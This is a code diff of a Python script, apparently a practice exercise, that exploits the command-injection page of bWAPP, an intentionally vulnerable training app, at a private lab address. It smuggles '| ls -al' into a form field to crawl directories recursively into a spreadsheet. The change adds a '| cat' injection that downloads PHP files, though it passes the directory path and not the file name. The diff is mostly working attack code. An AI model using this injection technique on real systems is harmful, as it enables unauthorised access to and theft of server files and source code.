@@ -10,7 +10,7 @@ tree_worksheet = tree_workbook.active
 #깊이 우선 탐색으로 file_type이 'd'인것을 찾기
 def dfs_directory_traversal(address, idx):
     headers = {
-        "referrer": "http://192.168.80.128/bWAPP/commandi.php",
+        "Referer": "http://192.168.80.128/bWAPP/commandi.php",
         "Cookie": "PHPSESSID=; security_level=0"
     }
     
@@ -18,6 +18,7 @@ def dfs_directory_traversal(address, idx):
         "target": "| ls -al " + address,
         "form": "submit"
     }
+    
     
     response = requests.post("http://192.168.80.128/bWAPP/commandi.php", headers=headers, data=data)
     html = response.content
@@ -40,7 +41,17 @@ def dfs_directory_traversal(address, idx):
             size = matches.group(6)
             last_modified = matches.group(7)
             name = matches.group(8)
-
+            if name.lower().endswith(".php"):
+                data = {
+                    "target": "| cat " + address,
+                    "form": "submit"
+                }
+    
+                response2 = requests.post("http://192.168.80.128/bWAPP/commandi.php", headers=headers, data=data)
+                html2 = response2.content
+                fd = open(name, "wb")
+                fd.write(html2)
+                fd.close()
             if file_type == "d" and name != "." and name != "..":
                 tree_worksheet.append([file_type, permissions, num_links, owner, group, size, last_modified, name, address])
                 dfs_directory_traversal(os.path.join(address + "/" + name), idx)
